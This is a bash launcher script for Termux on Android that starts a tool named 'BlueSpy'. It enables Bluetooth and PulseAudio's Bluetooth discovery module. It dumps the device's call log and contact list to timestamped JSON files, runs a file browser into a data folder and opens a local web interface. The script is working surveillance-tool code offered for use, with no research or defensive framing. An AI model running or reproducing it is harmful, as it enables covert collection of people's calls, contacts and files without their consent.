#!/data/data/com.termux/files/usr/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_color() {
    echo -e "${2}${1}${NC}"
}

if [ ! -d "/data/data/com.termux" ]; then
    print_color "This script must be run in Termux!" "$RED"
    exit 1
fi

print_color "Starting PulseAudio..." "$YELLOW"
pulseaudio --start

print_color "Loading Bluetooth module..." "$YELLOW"
pactl load-module module-bluetooth-discover

print_color "Starting data collection services..." "$YELLOW"
mkdir -p data/calls data/contacts data/files data/screenshots

print_color "Initializing Bluetooth connection..." "$BLUE"
termux-bluetooth-enable
sleep 2

print_color "Starting BlueSpy web interface..." "$GREEN"
if [ -f web_interface_termux.py ]; then
    python web_interface_termux.py &
else
    python web_interface.py &
fi

print_color "Starting call log collector..." "$YELLOW"
termux-telephony-call-log > data/calls/call_log_$(date +%Y%m%d_%H%M%S).json &

print_color "Starting contact collector..." "$YELLOW"
termux-contact-list > data/contacts/contacts_$(date +%Y%m%d_%H%M%S).json &

print_color "Starting file browser..." "$YELLOW"
python file_browser.py --output data/files &

print_color "Opening web interface in browser..." "$BLUE"
termux-open-url http://localhost:5000

wait